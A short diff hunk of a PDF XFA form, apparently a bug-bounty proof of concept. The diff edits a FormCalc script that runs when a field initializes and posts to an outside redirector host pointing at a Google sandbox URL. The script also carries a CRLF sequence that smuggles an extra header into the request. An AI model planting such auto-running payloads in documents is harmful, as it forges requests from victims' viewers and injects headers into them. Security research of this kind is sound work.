@@ -19,7 +19,7 @@ stream
         <field id="Hello World!">
             <event activity="initialize">
                 <script contentType='application/x-formcalc'>
-                    Post("https://bughunt1307.herokuapp.com/redirector.php?x=https://support-content-alpha.sandbox.google.com/wearos/apis/forum?v=1&#x26;hl=en&#x26;key=support-content&#x26;request_source=1&#x26;service_configuration=&#x26;mendel_ids=10800170,10800177,10800235,10800245,10800247,10800112","YOUR POST DATA","text/plain","utf-8","Content-Type: Dolphin&#x0d;&#x0a;Test: AAA")
+                    Post("https://bughunt1307.herokuapp.com/redirector.php?x=https://support-content-alpha.sandbox.google.com/wearos/apis/forum?v=1&amp;hl=en&amp;key=support-content&amp;request_source=1&amp;service_configuration=&amp;mendel_ids=10800170,10800177,10800235,10800245,10800247,10800112","YOUR POST DATA","text/plain","utf-8","Content-Type: Dolphin&#x0d;&#x0a;Test: AAA")
                 </script>
             </event>
         </field>
